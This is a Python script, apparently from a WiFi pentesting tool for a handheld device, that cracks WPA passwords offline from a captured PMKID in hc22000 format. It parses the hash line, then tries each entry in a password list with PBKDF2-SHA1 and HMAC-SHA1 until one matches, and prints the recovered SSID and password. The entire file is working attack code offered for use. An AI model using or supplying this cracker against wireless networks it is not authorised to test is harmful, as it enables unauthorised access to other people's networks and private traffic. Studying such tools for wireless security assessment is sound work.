import hashlib, hmac, struct, os

os.system('echo "' + "Running cracking script...\n" + '" > /dev/tty0')

passlist_src="/storage/roms/ports/RG353-WiFi-Pen/passlist.txt"

# Convert hc22000 format hashline to feed into cracking function
hashline = None
with open("/storage/roms/ports/RG353-WiFi-Pen/hashline.txt", 'r') as f:
    hashline = f.read().splitlines()[0]
hl = hashline.split("*")
pmkid = hl[2]
mac_ap = bytes.fromhex(hl[3])
mac_cl = bytes.fromhex(hl[4])
essid = bytes.fromhex(hl[5])

# Read passlist.txt into a python list
with open(passlist_src, 'r') as f:
    passlist = f.read().splitlines()

def crack_pmkid(pmkid, essid, mac_ap, mac_cl, passlist):
    print('\033[95m')
    print("PMKID:                    ", pmkid)
    print("SSID:                     ", essid.decode())
    print("AP MAC Address:           ", "%02x:%02x:%02x:%02x:%02x:%02x" % struct.unpack("BBBBBB", mac_ap))
    print("Client MAC Address:       ", "%02x:%02x:%02x:%02x:%02x:%02x" % struct.unpack("BBBBBB", mac_cl))
    print('\x1b[0m')

    for password in passlist:
        pmk = hashlib.pbkdf2_hmac('sha1', password.encode(), essid, 4096, 32)
        try_pmkid = hmac.digest(pmk, b"PMK Name"+mac_ap+mac_cl, hashlib.sha1).hex()[0:32]
        if (try_pmkid == pmkid):
            print('\033[92m' + try_pmkid, "- Matches captured PMKID\n")
            print("Password Cracked!\n" + '\x1b[0m')
            print("SSID:             ", essid.decode())
            print("Password:         ", password, "\n")
            return
        os.system('echo "' + str(try_pmkid) + '" > /dev/tty0')

    print('\033[91m' + "\nFailed to crack password. " + 
          "It may help to try a different passwords list. " + '\x1b[0m' + "\n")

crack_pmkid(pmkid, essid, mac_ap, mac_cl, passlist)